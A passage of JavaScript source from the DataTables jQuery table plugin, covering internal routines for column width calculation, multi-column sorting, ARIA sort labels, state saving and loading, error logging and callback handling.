		// only if we aren't holding the position

		if ( (settings.bSorted || settings.bFiltered) && ! settings._drawHold ) {

			divBodyEl.scrollTop = 0;

		}

	}

	

	

	

	/**

	 * Apply a given function to the display child nodes of an element array (typically

	 * TD children of TR rows

	 *  @param {function} fn Method to apply to the objects

	 *  @param array {nodes} an1 List of elements to look through for display children

	 *  @param array {nodes} an2 Another list (identical structure to the first) - optional

	 *  @memberof DataTable#oApi

	 */

	function _fnApplyToChildren( fn, an1, an2 )

	{

		var index=0, i=0, iLen=an1.length;

		var nNode1, nNode2;

	

		while ( i < iLen ) {

			nNode1 = an1[i].firstChild;

			nNode2 = an2 ? an2[i].firstChild : null;

	

			while ( nNode1 ) {

				if ( nNode1.nodeType === 1 ) {

					if ( an2 ) {

						fn( nNode1, nNode2, index );

					}

					else {

						fn( nNode1, index );

					}

	

					index++;

				}

	

				nNode1 = nNode1.nextSibling;

				nNode2 = an2 ? nNode2.nextSibling : null;

			}

	

			i++;

		}

	}

	

	

	

	var __re_html_remove = /<.*?>/g;

	

	

	/**

	 * Calculate the width of columns for the table

	 *  @param {object} oSettings dataTables settings object

	 *  @memberof DataTable#oApi

	 */

	function _fnCalculateColumnWidths ( oSettings )

	{

		var

			table = oSettings.nTable,

			columns = oSettings.aoColumns,

			scroll = oSettings.oScroll,

			scrollY = scroll.sY,

			scrollX = scroll.sX,

			scrollXInner = scroll.sXInner,

			columnCount = columns.length,

			visibleColumns = _fnGetColumns( oSettings, 'bVisible' ),

			headerCells = $('th', oSettings.nTHead),

			tableWidthAttr = table.getAttribute('width'), // from DOM element

			tableContainer = table.parentNode,

			userInputs = false,

			i, column, columnIdx, width, outerWidth,

			browser = oSettings.oBrowser,

			ie67 = browser.bScrollOversize;

	

		var styleWidth = table.style.width;

		if ( styleWidth && styleWidth.indexOf('%') !== -1 ) {

			tableWidthAttr = styleWidth;

		}

	

		/* Convert any user input sizes into pixel sizes */

		for ( i=0 ; i<visibleColumns.length ; i++ ) {

			column = columns[ visibleColumns[i] ];

	

			if ( column.sWidth !== null ) {

				column.sWidth = _fnConvertToWidth( column.sWidthOrig, tableContainer );

	

				userInputs = true;

			}

		}

	

		/* If the number of columns in the DOM equals the number that we have to

		 * process in DataTables, then we can use the offsets that are created by

		 * the web- browser. No custom sizes can be set in order for this to happen,

		 * nor scrolling used

		 */

		if ( ie67 || ! userInputs && ! scrollX && ! scrollY &&

		     columnCount == _fnVisbleColumns( oSettings ) &&

		     columnCount == headerCells.length

		) {

			for ( i=0 ; i<columnCount ; i++ ) {

				var colIdx = _fnVisibleToColumnIndex( oSettings, i );

	

				if ( colIdx !== null ) {

					columns[ colIdx ].sWidth = _fnStringToCss( headerCells.eq(i).width() );

				}

			}

		}

		else

		{

			// Otherwise construct a single row, worst case, table with the widest

			// node in the data, assign any user defined widths, then insert it into

			// the DOM and allow the browser to do all the hard work of calculating

			// table widths

			var tmpTable = $(table).clone() // don't use cloneNode - IE8 will remove events on the main table

				.css( 'visibility', 'hidden' )

				.removeAttr( 'id' );

	

			// Clean up the table body

			tmpTable.find('tbody tr').remove();

			var tr = $('<tr/>').appendTo( tmpTable.find('tbody') );

	

			// Clone the table header and footer - we can't use the header / footer

			// from the cloned table, since if scrolling is active, the table's

			// real header and footer are contained in different table tags

			tmpTable.find('thead, tfoot').remove();

			tmpTable

				.append( $(oSettings.nTHead).clone() )

				.append( $(oSettings.nTFoot).clone() );

	

			// Remove any assigned widths from the footer (from scrolling)

			tmpTable.find('tfoot th, tfoot td').css('width', '');

	

			// Apply custom sizing to the cloned header

			headerCells = _fnGetUniqueThs( oSettings, tmpTable.find('thead')[0] );

	

			for ( i=0 ; i<visibleColumns.length ; i++ ) {

				column = columns[ visibleColumns[i] ];

	

				headerCells[i].style.width = column.sWidthOrig !== null && column.sWidthOrig !== '' ?

					_fnStringToCss( column.sWidthOrig ) :

					'';

	

				// For scrollX we need to force the column width otherwise the

				// browser will collapse it. If this width is smaller than the

				// width the column requires, then it will have no effect

				if ( column.sWidthOrig && scrollX ) {

					$( headerCells[i] ).append( $('<div/>').css( {

						width: column.sWidthOrig,

						margin: 0,

						padding: 0,

						border: 0,

						height: 1

					} ) );

				}

			}

	

			// Find the widest cell for each column and put it into the table

			if ( oSettings.aoData.length ) {

				for ( i=0 ; i<visibleColumns.length ; i++ ) {

					columnIdx = visibleColumns[i];

					column = columns[ columnIdx ];

	

					$( _fnGetWidestNode( oSettings, columnIdx ) )

						.clone( false )

						.append( column.sContentPadding )

						.appendTo( tr );

				}

			}

	

			// Tidy the temporary table - remove name attributes so there aren't

			// duplicated in the dom (radio elements for example)

			$('[name]', tmpTable).removeAttr('name');

	

			// Table has been built, attach to the document so we can work with it.

			// A holding element is used, positioned at the top of the container

			// with minimal height, so it has no effect on if the container scrolls

			// or not. Otherwise it might trigger scrolling when it actually isn't

			// needed

			var holder = $('<div/>').css( scrollX || scrollY ?

					{

						position: 'absolute',

						top: 0,

						left: 0,

						height: 1,

						right: 0,

						overflow: 'hidden'

					} :

					{}

				)

				.append( tmpTable )

				.appendTo( tableContainer );

	

			// When scrolling (X or Y) we want to set the width of the table as 

			// appropriate. However, when not scrolling leave the table width as it

			// is. This results in slightly different, but I think correct behaviour

			if ( scrollX && scrollXInner ) {

				tmpTable.width( scrollXInner );

			}

			else if ( scrollX ) {

				tmpTable.css( 'width', 'auto' );

				tmpTable.removeAttr('width');

	

				// If there is no width attribute or style, then allow the table to

				// collapse

				if ( tmpTable.width() < tableContainer.clientWidth && tableWidthAttr ) {

					tmpTable.width( tableContainer.clientWidth );

				}

			}

			else if ( scrollY ) {

				tmpTable.width( tableContainer.clientWidth );

			}

			else if ( tableWidthAttr ) {

				tmpTable.width( tableWidthAttr );

			}

	

			// Get the width of each column in the constructed table - we need to

			// know the inner width (so it can be assigned to the other table's

			// cells) and the outer width so we can calculate the full width of the

			// table. This is safe since DataTables requires a unique cell for each

			// column, but if ever a header can span multiple columns, this will

			// need to be modified.

			var total = 0;

			for ( i=0 ; i<visibleColumns.length ; i++ ) {

				var cell = $(headerCells[i]);

				var border = cell.outerWidth() - cell.width();

	

				// Use getBounding... where possible (not IE8-) because it can give

				// sub-pixel accuracy, which we then want to round up!

				var bounding = browser.bBounding ?

					Math.ceil( headerCells[i].getBoundingClientRect().width ) :

					cell.outerWidth();

	

				// Total is tracked to remove any sub-pixel errors as the outerWidth

				// of the table might not equal the total given here (IE!).

				total += bounding;

	

				// Width for each column to use

				columns[ visibleColumns[i] ].sWidth = _fnStringToCss( bounding - border );

			}

	

			table.style.width = _fnStringToCss( total );

	

			// Finished with the table - ditch it

			holder.remove();

		}

	

		// If there is a width attr, we want to attach an event listener which

		// allows the table sizing to automatically adjust when the window is

		// resized. Use the width attr rather than CSS, since we can't know if the

		// CSS is a relative value or absolute - DOM read is always px.

		if ( tableWidthAttr ) {

			table.style.width = _fnStringToCss( tableWidthAttr );

		}

	

		if ( (tableWidthAttr || scrollX) && ! oSettings._reszEvt ) {

			var bindResize = function () {

				$(window).on('resize.DT-'+oSettings.sInstance, _fnThrottle( function () {

					_fnAdjustColumnSizing( oSettings );

				} ) );

			};

	

			// IE6/7 will crash if we bind a resize event handler on page load.

			// To be removed in 1.11 which drops IE6/7 support

			if ( ie67 ) {

				setTimeout( bindResize, 1000 );

			}

			else {

				bindResize();

			}

	

			oSettings._reszEvt = true;

		}

	}

	

	

	/**

	 * Throttle the calls to a function. Arguments and context are maintained for

	 * the throttled function

	 *  @param {function} fn Function to be called

	 *  @param {int} [freq=200] call frequency in mS

	 *  @returns {function} wrapped function

	 *  @memberof DataTable#oApi

	 */

	var _fnThrottle = DataTable.util.throttle;

	

	

	/**

	 * Convert a CSS unit width to pixels (e.g. 2em)

	 *  @param {string} width width to be converted

	 *  @param {node} parent parent to get the with for (required for relative widths) - optional

	 *  @returns {int} width in pixels

	 *  @memberof DataTable#oApi

	 */

	function _fnConvertToWidth ( width, parent )

	{

		if ( ! width ) {

			return 0;

		}

	

		var n = $('<div/>')

			.css( 'width', _fnStringToCss( width ) )

			.appendTo( parent || document.body );

	

		var val = n[0].offsetWidth;

		n.remove();

	

		return val;

	}

	

	

	/**

	 * Get the widest node

	 *  @param {object} settings dataTables settings object

	 *  @param {int} colIdx column of interest

	 *  @returns {node} widest table node

	 *  @memberof DataTable#oApi

	 */

	function _fnGetWidestNode( settings, colIdx )

	{

		var idx = _fnGetMaxLenString( settings, colIdx );

		if ( idx < 0 ) {

			return null;

		}

	

		var data = settings.aoData[ idx ];

		return ! data.nTr ? // Might not have been created when deferred rendering

			$('<td/>').html( _fnGetCellData( settings, idx, colIdx, 'display' ) )[0] :

			data.anCells[ colIdx ];

	}

	

	

	/**

	 * Get the maximum strlen for each data column

	 *  @param {object} settings dataTables settings object

	 *  @param {int} colIdx column of interest

	 *  @returns {string} max string length for each column

	 *  @memberof DataTable#oApi

	 */

	function _fnGetMaxLenString( settings, colIdx )

	{

		var s, max=-1, maxIdx = -1;

	

		for ( var i=0, ien=settings.aoData.length ; i<ien ; i++ ) {

			s = _fnGetCellData( settings, i, colIdx, 'display' )+'';

			s = s.replace( __re_html_remove, '' );

			s = s.replace( /&nbsp;/g, ' ' );

	

			if ( s.length > max ) {

				max = s.length;

				maxIdx = i;

			}

		}

	

		return maxIdx;

	}

	

	

	/**

	 * Append a CSS unit (only if required) to a string

	 *  @param {string} value to css-ify

	 *  @returns {string} value with css unit

	 *  @memberof DataTable#oApi

	 */

	function _fnStringToCss( s )

	{

		if ( s === null ) {

			return '0px';

		}

	

		if ( typeof s == 'number' ) {

			return s < 0 ?

				'0px' :

				s+'px';

		}

	

		// Check it has a unit character already

		return s.match(/\d$/) ?

			s+'px' :

			s;

	}

	

	

	

	function _fnSortFlatten ( settings )

	{

		var

			i, iLen, k, kLen,

			aSort = [],

			aiOrig = [],

			aoColumns = settings.aoColumns,

			aDataSort, iCol, sType, srcCol,

			fixed = settings.aaSortingFixed,

			fixedObj = $.isPlainObject( fixed ),

			nestedSort = [],

			add = function ( a ) {

				if ( a.length && ! $.isArray( a[0] ) ) {

					// 1D array

					nestedSort.push( a );

				}

				else {

					// 2D array

					$.merge( nestedSort, a );

				}

			};

	

		// Build the sort array, with pre-fix and post-fix options if they have been

		// specified

		if ( $.isArray( fixed ) ) {

			add( fixed );

		}

	

		if ( fixedObj && fixed.pre ) {

			add( fixed.pre );

		}

	

		add( settings.aaSorting );

	

		if (fixedObj && fixed.post ) {

			add( fixed.post );

		}

	

		for ( i=0 ; i<nestedSort.length ; i++ )

		{

			srcCol = nestedSort[i][0];

			aDataSort = aoColumns[ srcCol ].aDataSort;

	

			for ( k=0, kLen=aDataSort.length ; k<kLen ; k++ )

			{

				iCol = aDataSort[k];

				sType = aoColumns[ iCol ].sType || 'string';

	

				if ( nestedSort[i]._idx === undefined ) {

					nestedSort[i]._idx = $.inArray( nestedSort[i][1], aoColumns[iCol].asSorting );

				}

	

				aSort.push( {

					src:       srcCol,

					col:       iCol,

					dir:       nestedSort[i][1],

					index:     nestedSort[i]._idx,

					type:      sType,

					formatter: DataTable.ext.type.order[ sType+"-pre" ]

				} );

			}

		}

	

		return aSort;

	}

	

	/**

	 * Change the order of the table

	 *  @param {object} oSettings dataTables settings object

	 *  @memberof DataTable#oApi

	 *  @todo This really needs split up!

	 */

	function _fnSort ( oSettings )

	{

		var

			i, ien, iLen, j, jLen, k, kLen,

			sDataType, nTh,

			aiOrig = [],

			oExtSort = DataTable.ext.type.order,

			aoData = oSettings.aoData,

			aoColumns = oSettings.aoColumns,

			aDataSort, data, iCol, sType, oSort,

			formatters = 0,

			sortCol,

			displayMaster = oSettings.aiDisplayMaster,

			aSort;

	

		// Resolve any column types that are unknown due to addition or invalidation

		// @todo Can this be moved into a 'data-ready' handler which is called when

		//   data is going to be used in the table?

		_fnColumnTypes( oSettings );

	

		aSort = _fnSortFlatten( oSettings );

	

		for ( i=0, ien=aSort.length ; i<ien ; i++ ) {

			sortCol = aSort[i];

	

			// Track if we can use the fast sort algorithm

			if ( sortCol.formatter ) {

				formatters++;

			}

	

			// Load the data needed for the sort, for each cell

			_fnSortData( oSettings, sortCol.col );

		}

	

		/* No sorting required if server-side or no sorting array */

		if ( _fnDataSource( oSettings ) != 'ssp' && aSort.length !== 0 )

		{

			// Create a value - key array of the current row positions such that we can use their

			// current position during the sort, if values match, in order to perform stable sorting

			for ( i=0, iLen=displayMaster.length ; i<iLen ; i++ ) {

				aiOrig[ displayMaster[i] ] = i;

			}

	

			/* Do the sort - here we want multi-column sorting based on a given data source (column)

			 * and sorting function (from oSort) in a certain direction. It's reasonably complex to

			 * follow on it's own, but this is what we want (example two column sorting):

			 *  fnLocalSorting = function(a,b){

			 *    var iTest;

			 *    iTest = oSort['string-asc']('data11', 'data12');

			 *      if (iTest !== 0)

			 *        return iTest;

			 *    iTest = oSort['numeric-desc']('data21', 'data22');

			 *    if (iTest !== 0)

			 *      return iTest;

			 *    return oSort['numeric-asc']( aiOrig[a], aiOrig[b] );

			 *  }

			 * Basically we have a test for each sorting column, if the data in that column is equal,

			 * test the next column. If all columns match, then we use a numeric sort on the row

			 * positions in the original data array to provide a stable sort.

			 *

			 * Note - I know it seems excessive to have two sorting methods, but the first is around

			 * 15% faster, so the second is only maintained for backwards compatibility with sorting

			 * methods which do not have a pre-sort formatting function.

			 */

			if ( formatters === aSort.length ) {

				// All sort types have formatting functions

				displayMaster.sort( function ( a, b ) {

					var

						x, y, k, test, sort,

						len=aSort.length,

						dataA = aoData[a]._aSortData,

						dataB = aoData[b]._aSortData;

	

					for ( k=0 ; k<len ; k++ ) {

						sort = aSort[k];

	

						x = dataA[ sort.col ];

						y = dataB[ sort.col ];

	

						test = x<y ? -1 : x>y ? 1 : 0;

						if ( test !== 0 ) {

							return sort.dir === 'asc' ? test : -test;

						}

					}

	

					x = aiOrig[a];

					y = aiOrig[b];

					return x<y ? -1 : x>y ? 1 : 0;

				} );

			}

			else {

				// Depreciated - remove in 1.11 (providing a plug-in option)

				// Not all sort types have formatting methods, so we have to call their sorting

				// methods.

				displayMaster.sort( function ( a, b ) {

					var

						x, y, k, l, test, sort, fn,

						len=aSort.length,

						dataA = aoData[a]._aSortData,

						dataB = aoData[b]._aSortData;

	

					for ( k=0 ; k<len ; k++ ) {

						sort = aSort[k];

	

						x = dataA[ sort.col ];

						y = dataB[ sort.col ];

	

						fn = oExtSort[ sort.type+"-"+sort.dir ] || oExtSort[ "string-"+sort.dir ];

						test = fn( x, y );

						if ( test !== 0 ) {

							return test;

						}

					}

	

					x = aiOrig[a];

					y = aiOrig[b];

					return x<y ? -1 : x>y ? 1 : 0;

				} );

			}

		}

	

		/* Tell the draw function that we have sorted the data */

		oSettings.bSorted = true;

	}

	

	

	function _fnSortAria ( settings )

	{

		var label;

		var nextSort;

		var columns = settings.aoColumns;

		var aSort = _fnSortFlatten( settings );

		var oAria = settings.oLanguage.oAria;

	

		// ARIA attributes - need to loop all columns, to update all (removing old

		// attributes as needed)

		for ( var i=0, iLen=columns.length ; i<iLen ; i++ )

		{

			var col = columns[i];

			var asSorting = col.asSorting;

			var sTitle = col.sTitle.replace( /<.*?>/g, "" );

			var th = col.nTh;

	

			// IE7 is throwing an error when setting these properties with jQuery's

			// attr() and removeAttr() methods...

			th.removeAttribute('aria-sort');

	

			/* In ARIA only the first sorting column can be marked as sorting - no multi-sort option */

			if ( col.bSortable ) {

				if ( aSort.length > 0 && aSort[0].col == i ) {

					th.setAttribute('aria-sort', aSort[0].dir=="asc" ? "ascending" : "descending" );

					nextSort = asSorting[ aSort[0].index+1 ] || asSorting[0];

				}

				else {

					nextSort = asSorting[0];

				}

	

				label = sTitle + ( nextSort === "asc" ?

					oAria.sSortAscending :

					oAria.sSortDescending

				);

			}

			else {

				label = sTitle;

			}

	

			th.setAttribute('aria-label', label);

		}

	}

	

	

	/**

	 * Function to run on user sort request

	 *  @param {object} settings dataTables settings object

	 *  @param {node} attachTo node to attach the handler to

	 *  @param {int} colIdx column sorting index

	 *  @param {boolean} [append=false] Append the requested sort to the existing

	 *    sort if true (i.e. multi-column sort)

	 *  @param {function} [callback] callback function

	 *  @memberof DataTable#oApi

	 */

	function _fnSortListener ( settings, colIdx, append, callback )

	{

		var col = settings.aoColumns[ colIdx ];

		var sorting = settings.aaSorting;

		var asSorting = col.asSorting;

		var nextSortIdx;

		var next = function ( a, overflow ) {

			var idx = a._idx;

			if ( idx === undefined ) {

				idx = $.inArray( a[1], asSorting );

			}

	

			return idx+1 < asSorting.length ?

				idx+1 :

				overflow ?

					null :

					0;

		};

	

		// Convert to 2D array if needed

		if ( typeof sorting[0] === 'number' ) {

			sorting = settings.aaSorting = [ sorting ];

		}

	

		// If appending the sort then we are multi-column sorting

		if ( append && settings.oFeatures.bSortMulti ) {

			// Are we already doing some kind of sort on this column?

			var sortIdx = $.inArray( colIdx, _pluck(sorting, '0') );

	

			if ( sortIdx !== -1 ) {

				// Yes, modify the sort

				nextSortIdx = next( sorting[sortIdx], true );

	

				if ( nextSortIdx === null && sorting.length === 1 ) {

					nextSortIdx = 0; // can't remove sorting completely

				}

	

				if ( nextSortIdx === null ) {

					sorting.splice( sortIdx, 1 );

				}

				else {

					sorting[sortIdx][1] = asSorting[ nextSortIdx ];

					sorting[sortIdx]._idx = nextSortIdx;

				}

			}

			else {

				// No sort on this column yet

				sorting.push( [ colIdx, asSorting[0], 0 ] );

				sorting[sorting.length-1]._idx = 0;

			}

		}

		else if ( sorting.length && sorting[0][0] == colIdx ) {

			// Single column - already sorting on this column, modify the sort

			nextSortIdx = next( sorting[0] );

	

			sorting.length = 1;

			sorting[0][1] = asSorting[ nextSortIdx ];

			sorting[0]._idx = nextSortIdx;

		}

		else {

			// Single column - sort only on this column

			sorting.length = 0;

			sorting.push( [ colIdx, asSorting[0] ] );

			sorting[0]._idx = 0;

		}

	

		// Run the sort by calling a full redraw

		_fnReDraw( settings );

	

		// callback used for async user interaction

		if ( typeof callback == 'function' ) {

			callback( settings );

		}

	}

	

	

	/**

	 * Attach a sort handler (click) to a node

	 *  @param {object} settings dataTables settings object

	 *  @param {node} attachTo node to attach the handler to

	 *  @param {int} colIdx column sorting index

	 *  @param {function} [callback] callback function

	 *  @memberof DataTable#oApi

	 */

	function _fnSortAttachListener ( settings, attachTo, colIdx, callback )

	{

		var col = settings.aoColumns[ colIdx ];

	

		_fnBindAction( attachTo, {}, function (e) {

			/* If the column is not sortable - don't to anything */

			if ( col.bSortable === false ) {

				return;

			}

	

			// If processing is enabled use a timeout to allow the processing

			// display to be shown - otherwise to it synchronously

			if ( settings.oFeatures.bProcessing ) {

				_fnProcessingDisplay( settings, true );

	

				setTimeout( function() {

					_fnSortListener( settings, colIdx, e.shiftKey, callback );

	

					// In server-side processing, the draw callback will remove the

					// processing display

					if ( _fnDataSource( settings ) !== 'ssp' ) {

						_fnProcessingDisplay( settings, false );

					}

				}, 0 );

			}

			else {

				_fnSortListener( settings, colIdx, e.shiftKey, callback );

			}

		} );

	}

	

	

	/**

	 * Set the sorting classes on table's body, Note: it is safe to call this function

	 * when bSort and bSortClasses are false

	 *  @param {object} oSettings dataTables settings object

	 *  @memberof DataTable#oApi

	 */

	function _fnSortingClasses( settings )

	{

		var oldSort = settings.aLastSort;

		var sortClass = settings.oClasses.sSortColumn;

		var sort = _fnSortFlatten( settings );

		var features = settings.oFeatures;

		var i, ien, colIdx;

	

		if ( features.bSort && features.bSortClasses ) {

			// Remove old sorting classes

			for ( i=0, ien=oldSort.length ; i<ien ; i++ ) {

				colIdx = oldSort[i].src;

	

				// Remove column sorting

				$( _pluck( settings.aoData, 'anCells', colIdx ) )

					.removeClass( sortClass + (i<2 ? i+1 : 3) );

			}

	

			// Add new column sorting

			for ( i=0, ien=sort.length ; i<ien ; i++ ) {

				colIdx = sort[i].src;

	

				$( _pluck( settings.aoData, 'anCells', colIdx ) )

					.addClass( sortClass + (i<2 ? i+1 : 3) );

			}

		}

	

		settings.aLastSort = sort;

	}

	

	

	// Get the data to sort a column, be it from cache, fresh (populating the

	// cache), or from a sort formatter

	function _fnSortData( settings, idx )

	{

		// Custom sorting function - provided by the sort data type

		var column = settings.aoColumns[ idx ];

		var customSort = DataTable.ext.order[ column.sSortDataType ];

		var customData;

	

		if ( customSort ) {

			customData = customSort.call( settings.oInstance, settings, idx,

				_fnColumnIndexToVisible( settings, idx )

			);

		}

	

		// Use / populate cache

		var row, cellData;

		var formatter = DataTable.ext.type.order[ column.sType+"-pre" ];

	

		for ( var i=0, ien=settings.aoData.length ; i<ien ; i++ ) {

			row = settings.aoData[i];

	

			if ( ! row._aSortData ) {

				row._aSortData = [];

			}

	

			if ( ! row._aSortData[idx] || customSort ) {

				cellData = customSort ?

					customData[i] : // If there was a custom sort function, use data from there

					_fnGetCellData( settings, i, idx, 'sort' );

	

				row._aSortData[ idx ] = formatter ?

					formatter( cellData ) :

					cellData;

			}

		}

	}

	

	

	

	/**

	 * Save the state of a table

	 *  @param {object} oSettings dataTables settings object

	 *  @memberof DataTable#oApi

	 */

	function _fnSaveState ( settings )

	{

		if ( !settings.oFeatures.bStateSave || settings.bDestroying )

		{

			return;

		}

	

		/* Store the interesting variables */

		var state = {

			time:    +new Date(),

			start:   settings._iDisplayStart,

			length:  settings._iDisplayLength,

			order:   $.extend( true, [], settings.aaSorting ),

			search:  _fnSearchToCamel( settings.oPreviousSearch ),

			columns: $.map( settings.aoColumns, function ( col, i ) {

				return {

					visible: col.bVisible,

					search: _fnSearchToCamel( settings.aoPreSearchCols[i] )

				};

			} )

		};

	

		_fnCallbackFire( settings, "aoStateSaveParams", 'stateSaveParams', [settings, state] );

	

		settings.oSavedState = state;

		settings.fnStateSaveCallback.call( settings.oInstance, settings, state );

	}

	

	

	/**

	 * Attempt to load a saved table state

	 *  @param {object} oSettings dataTables settings object

	 *  @param {object} oInit DataTables init object so we can override settings

	 *  @param {function} callback Callback to execute when the state has been loaded

	 *  @memberof DataTable#oApi

	 */

	function _fnLoadState ( settings, oInit, callback )

	{

		var i, ien;

		var columns = settings.aoColumns;

		var loaded = function ( s ) {

			if ( ! s || ! s.time ) {

				callback();

				return;

			}

	

			// Allow custom and plug-in manipulation functions to alter the saved data set and

			// cancelling of loading by returning false

			var abStateLoad = _fnCallbackFire( settings, 'aoStateLoadParams', 'stateLoadParams', [settings, s] );

			if ( $.inArray( false, abStateLoad ) !== -1 ) {

				callback();

				return;

			}

	

			// Reject old data

			var duration = settings.iStateDuration;

			if ( duration > 0 && s.time < +new Date() - (duration*1000) ) {

				callback();

				return;

			}

	

			// Number of columns have changed - all bets are off, no restore of settings

			if ( s.columns && columns.length !== s.columns.length ) {

				callback();

				return;

			}

	

			// Store the saved state so it might be accessed at any time

			settings.oLoadedState = $.extend( true, {}, s );

	

			// Restore key features - todo - for 1.11 this needs to be done by

			// subscribed events

			if ( s.start !== undefined ) {

				settings._iDisplayStart    = s.start;

				settings.iInitDisplayStart = s.start;

			}

			if ( s.length !== undefined ) {

				settings._iDisplayLength   = s.length;

			}

	

			// Order

			if ( s.order !== undefined ) {

				settings.aaSorting = [];

				$.each( s.order, function ( i, col ) {

					settings.aaSorting.push( col[0] >= columns.length ?

						[ 0, col[1] ] :

						col

					);

				} );

			}

	

			// Search

			if ( s.search !== undefined ) {

				$.extend( settings.oPreviousSearch, _fnSearchToHung( s.search ) );

			}

	

			// Columns

			//

			if ( s.columns ) {

				for ( i=0, ien=s.columns.length ; i<ien ; i++ ) {

					var col = s.columns[i];

	

					// Visibility

					if ( col.visible !== undefined ) {

						columns[i].bVisible = col.visible;

					}

	

					// Search

					if ( col.search !== undefined ) {

						$.extend( settings.aoPreSearchCols[i], _fnSearchToHung( col.search ) );

					}

				}

			}

	

			_fnCallbackFire( settings, 'aoStateLoaded', 'stateLoaded', [settings, s] );

			callback();

		};

	

		if ( ! settings.oFeatures.bStateSave ) {

			callback();

			return;

		}

	

		var state = settings.fnStateLoadCallback.call( settings.oInstance, settings, loaded );

	

		if ( state !== undefined ) {

			loaded( state );

		}

		// otherwise, wait for the loaded callback to be executed

	}

	

	

	/**

	 * Return the settings object for a particular table

	 *  @param {node} table table we are using as a dataTable

	 *  @returns {object} Settings object - or null if not found

	 *  @memberof DataTable#oApi

	 */

	function _fnSettingsFromNode ( table )

	{

		var settings = DataTable.settings;

		var idx = $.inArray( table, _pluck( settings, 'nTable' ) );

	

		return idx !== -1 ?

			settings[ idx ] :

			null;

	}

	

	

	/**

	 * Log an error message

	 *  @param {object} settings dataTables settings object

	 *  @param {int} level log error messages, or display them to the user

	 *  @param {string} msg error message

	 *  @param {int} tn Technical note id to get more information about the error.

	 *  @memberof DataTable#oApi

	 */

	function _fnLog( settings, level, msg, tn )

	{

		msg = 'DataTables warning: '+

			(settings ? 'table id='+settings.sTableId+' - ' : '')+msg;

	

		if ( tn ) {

			msg += '. For more information about this error, please see '+

			'http://datatables.net/tn/'+tn;

		}

	

		if ( ! level  ) {

			// Backwards compatibility pre 1.10

			var ext = DataTable.ext;

			var type = ext.sErrMode || ext.errMode;

	

			if ( settings ) {

				_fnCallbackFire( settings, null, 'error', [ settings, tn, msg ] );

			}

	

			if ( type == 'alert' ) {

				alert( msg );

			}

			else if ( type == 'throw' ) {

				throw new Error(msg);

			}

			else if ( typeof type == 'function' ) {

				type( settings, tn, msg );

			}

		}

		else if ( window.console && console.log ) {

			console.log( msg );

		}

	}

	

	

	/**

	 * See if a property is defined on one object, if so assign it to the other object

	 *  @param {object} ret target object

	 *  @param {object} src source object

	 *  @param {string} name property

	 *  @param {string} [mappedName] name to map too - optional, name used if not given

	 *  @memberof DataTable#oApi

	 */

	function _fnMap( ret, src, name, mappedName )

	{

		if ( $.isArray( name ) ) {

			$.each( name, function (i, val) {

				if ( $.isArray( val ) ) {

					_fnMap( ret, src, val[0], val[1] );

				}

				else {

					_fnMap( ret, src, val );

				}

			} );

	

			return;

		}

	

		if ( mappedName === undefined ) {

			mappedName = name;

		}

	

		if ( src[name] !== undefined ) {

			ret[mappedName] = src[name];

		}

	}

	

	

	/**

	 * Extend objects - very similar to jQuery.extend, but deep copy objects, and

	 * shallow copy arrays. The reason we need to do this, is that we don't want to

	 * deep copy array init values (such as aaSorting) since the dev wouldn't be

	 * able to override them, but we do want to deep copy arrays.

	 *  @param {object} out Object to extend

	 *  @param {object} extender Object from which the properties will be applied to

	 *      out

	 *  @param {boolean} breakRefs If true, then arrays will be sliced to take an

	 *      independent copy with the exception of the `data` or `aaData` parameters

	 *      if they are present. This is so you can pass in a collection to

	 *      DataTables and have that used as your data source without breaking the

	 *      references

	 *  @returns {object} out Reference, just for convenience - out === the return.

	 *  @memberof DataTable#oApi

	 *  @todo This doesn't take account of arrays inside the deep copied objects.

	 */

	function _fnExtend( out, extender, breakRefs )

	{

		var val;

	

		for ( var prop in extender ) {

			if ( extender.hasOwnProperty(prop) ) {

				val = extender[prop];

	

				if ( $.isPlainObject( val ) ) {

					if ( ! $.isPlainObject( out[prop] ) ) {

						out[prop] = {};

					}

					$.extend( true, out[prop], val );

				}

				else if ( breakRefs && prop !== 'data' && prop !== 'aaData' && $.isArray(val) ) {

					out[prop] = val.slice();

				}

				else {

					out[prop] = val;

				}

			}

		}

	

		return out;

	}

	

	

	/**

	 * Bind an event handers to allow a click or return key to activate the callback.

	 * This is good for accessibility since a return on the keyboard will have the

	 * same effect as a click, if the element has focus.

	 *  @param {element} n Element to bind the action to

	 *  @param {object} oData Data object to pass to the triggered function

	 *  @param {function} fn Callback function for when the event is triggered

	 *  @memberof DataTable#oApi

	 */

	function _fnBindAction( n, oData, fn )

	{

		$(n)

			.on( 'click.DT', oData, function (e) {

					$(n).trigger('blur'); // Remove focus outline for mouse users

					fn(e);

				} )

			.on( 'keypress.DT', oData, function (e){

					if ( e.which === 13 ) {

						e.preventDefault();

						fn(e);

					}

				} )

			.on( 'selectstart.DT', function () {

					/* Take the brutal approach to cancelling text selection */

					return false;

				} );

	}

	

	

	/**

	 * Register a callback function. Easily allows a callback function to be added to

	 * an array store of callback functions that can then all be called together.

	 *  @param {object} oSettings dataTables settings object

	 *  @param {string} sStore Name of the array storage for the callbacks in oSettings

	 *  @param {function} fn Function to be called back

	 *  @param {string} sName Identifying name for the callback (i.e. a label)

	 *  @memberof DataTable#oApi

	 */

	function _fnCallbackReg( oSettings, sStore, fn, sName )

	{

		if ( fn )

		{

			oSettings[sStore].push( {

				"fn": fn,

				"sName": sName

			} );

		}

	}

	

	

	/**

	 * Fire callback functions and trigger events. Note that the loop over the

	 * callback array store is done backwards! Further note that you do not want to

	 * fire off triggers in time sensitive applications (for example cell creation)

	 * as its slow.

	 *  @param {object} settings dataTables settings object

	 *  @param {string} callbackArr Name of the array storage for the callbacks in

	 *      oSettings

	 *  @param {string} eventName Name of the jQuery custom event to trigger. If

	 *      null no trigger is fired

	 *  @param {array} args Array of arguments to pass to the callback function /

	 *      trigger

	 *  @memberof DataTable#oApi

	 */

	function _fnCallbackFire( settings, callbackArr, eventName, args )

	{

		var ret = [];

	

		if ( callbackArr ) {

			ret = $.map( settings[callbackArr].slice().reverse(), function (val, i) {

				return val.fn.apply( settings.oInstance, args );

			} );

		}

	

		if ( eventName !== null ) {

			var e = $.Event( eventName+'.dt' );

	

			$(settings.nTable).trigger( e, args );

	

			ret.push( e.result );

		}

	

		return ret;

	}

	

	

	function _fnLengthOverflow ( settings )

	{

		var

			start = settings._iDisplayStart,

			end = settings.fnDisplayEnd(),

			len = settings._iDisplayLength;

	

		/* If we have space to show extra rows (backing up from the end point - then do so */

		if ( start >= end )

		{

			start = end - len;

		}

	

		// Keep the start record on the current page

		start -= (start % len);

	

		if ( len === -1 || start < 0 )

		{

			start = 0;

		}

	

